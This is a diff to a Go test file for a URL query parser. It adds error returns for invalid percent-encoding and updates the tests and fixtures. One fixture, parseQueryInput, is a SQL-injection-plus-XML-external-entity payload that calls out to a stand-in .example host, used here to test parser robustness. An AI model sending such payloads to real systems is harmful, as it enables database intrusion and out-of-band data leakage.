@@ -4,20 +4,24 @@
 package url
 
 import (
+	"errors"
 	"testing"
 )
 
 var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
 
 func TestUrlPayloads(t *testing.T) {
-	q, _ := ParseQuery(parseQueryInput, '&', 0)
+	q, _, err := ParseQuery(parseQueryInput, '&', 0)
+	if !errors.Is(err, ErrInvalidURLEncoding) {
+		t.Fatalf("expected ErrInvalidURLEncoding, got %v", err)
+	}
 	if len(q["var"]) == 0 {
 		t.Error("var is empty")
 	}
 }
 
 func TestParseQueryLimit(t *testing.T) {
-	q, truncated := ParseQuery("a=1&b=2&c=3&d=4", '&', 2)
+	q, truncated, _ := ParseQuery("a=1&b=2&c=3&d=4", '&', 2)
 	if !truncated {
 		t.Error("expected truncated to be true")
 	}
@@ -25,7 +29,7 @@ func TestParseQueryLimit(t *testing.T) {
 		t.Errorf("expected 2 parsed pairs, got %d: %v", len(q), q)
 	}
 
-	q, truncated = ParseQuery("a=1&b=2&c=3&d=4", '&', 10)
+	q, truncated, _ = ParseQuery("a=1&b=2&c=3&d=4", '&', 10)
 	if truncated {
 		t.Error("expected truncated to be false when limit is not reached")
 	}
@@ -33,7 +37,7 @@ func TestParseQueryLimit(t *testing.T) {
 		t.Errorf("expected 4 parsed pairs, got %d: %v", len(q), q)
 	}
 
-	q, truncated = ParseQuery("a=1&b=2", '&', 0)
+	q, truncated, _ = ParseQuery("a=1&b=2", '&', 0)
 	if truncated {
 		t.Error("expected truncated to be false when limit is 0 (no limit)")
 	}
@@ -45,7 +49,7 @@ func TestParseQueryLimit(t *testing.T) {
 func TestParseQueryLimitCountsTotalPairsNotDistinctKeys(t *testing.T) {
 	// Many values under a single repeated key must still be bounded by the
 	// limit, not just the number of distinct keys.
-	q, truncated := ParseQuery("a=1&a=1&a=1&a=1&a=1", '&', 2)
+	q, truncated, _ := ParseQuery("a=1&a=1&a=1&a=1&a=1", '&', 2)
 	if !truncated {
 		t.Error("expected truncated to be true")
 	}
@@ -55,7 +59,7 @@ func TestParseQueryLimitCountsTotalPairsNotDistinctKeys(t *testing.T) {
 }
 
 func TestParseQueryOrdered(t *testing.T) {
-	pairs, truncated := ParseQueryOrdered("a=1&b=2&c=3", '&', 0)
+	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&c=3", '&', 0)
 	if truncated {
 		t.Error("expected truncated to be false when limit is 0 (no limit)")
 	}
@@ -71,7 +75,7 @@ func TestParseQueryOrdered(t *testing.T) {
 }
 
 func TestParseQueryOrderedLimit(t *testing.T) {
-	pairs, truncated := ParseQueryOrdered("a=1&b=2&c=3&d=4", '&', 2)
+	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&c=3&d=4", '&', 2)
 	if !truncated {
 		t.Error("expected truncated to be true")
 	}
@@ -87,7 +91,7 @@ func TestParseQueryOrderedLimit(t *testing.T) {
 // check used to run before the empty-key skip, so a trailing separator right
 // at the limit reported truncation even though nothing more was dropped.
 func TestParseQueryLimitTrailingSeparatorAtLimit(t *testing.T) {
-	q, truncated := ParseQuery("a=1&b=2&&", '&', 2)
+	q, truncated, _ := ParseQuery("a=1&b=2&&", '&', 2)
 	if truncated {
 		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
 	}
@@ -99,7 +103,7 @@ func TestParseQueryLimitTrailingSeparatorAtLimit(t *testing.T) {
 // TestParseQueryOrderedTrailingSeparatorAtLimit mirrors
 // TestParseQueryLimitTrailingSeparatorAtLimit for the ordered parser.
 func TestParseQueryOrderedTrailingSeparatorAtLimit(t *testing.T) {
-	pairs, truncated := ParseQueryOrdered("a=1&b=2&&", '&', 2)
+	pairs, truncated, _ := ParseQueryOrdered("a=1&b=2&&", '&', 2)
 	if truncated {
 		t.Error("expected truncated to be false: the trailing '&&' adds no pair beyond the limit")
 	}
@@ -110,40 +114,45 @@ func TestParseQueryOrderedTrailingSeparatorAtLimit(t *testing.T) {
 
 func BenchmarkParseQuery(b *testing.B) {
 	for i := 0; i < b.N; i++ {
-		ParseQuery(parseQueryInput, '&', 0)
+		_, _, _ = ParseQuery(parseQueryInput, '&', 0)
 	}
 }
 
 func BenchmarkParseQueryLimited(b *testing.B) {
 	for i := 0; i < b.N; i++ {
-		ParseQuery(parseQueryInput, '&', 1)
+		_, _, _ = ParseQuery(parseQueryInput, '&', 1)
 	}
 }
 
-var queryUnescapePayloads = map[string]string{
-	"sample":    "sample",
-	"s%20ample": "s ample",
-	"s+ample":   "s ample",
-	"s%2fample": "s/ample",
-	"s% ample":  "s% ample",  // non-strict sample
-	"s%ssample": "s%ssample", // non-strict sample
-	"s%00ample": "s\x00ample",
-	"%7B%%7d":   "{%}",
-	"%7B+%+%7d": "{ % }",
+var queryUnescapePayloads = map[string]struct {
+	value string
+	err   error
+}{
+	"sample":    {"sample", nil},
+	"s%20ample": {"s ample", nil},
+	"s+ample":   {"s ample", nil},
+	"s%2fample": {"s/ample", nil},
+	"s% ample":  {"s% ample", ErrInvalidURLEncoding},
+	"s%ssample": {"s%ssample", ErrInvalidURLEncoding},
+	"s%00ample": {"s\x00ample", nil},
+	"%7B%%7d":   {"{%}", ErrInvalidURLEncoding},
+	"%7B+%+%7d": {"{ % }", ErrInvalidURLEncoding},
 }
 
 func TestQueryUnescape(t *testing.T) {
 	for k, v := range queryUnescapePayloads {
-		if out := queryUnescape(k); out != v {
-			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
-		}
+		t.Run(k, func(t *testing.T) {
+			if out, err := queryUnescape(k); out != v.value || !errors.Is(err, v.err) {
+				t.Errorf("Error parsing %q, got %q and err=%v; expected %q and err=%v", k, out, err, v.value, v.err)
+			}
+		})
 	}
 }
 
 func BenchmarkQueryUnescape(b *testing.B) {
 	for i := 0; i < b.N; i++ {
 		for k := range queryUnescapePayloads {
-			queryUnescape(k)
+			_, _ = queryUnescape(k)
 		}
 	}
 }
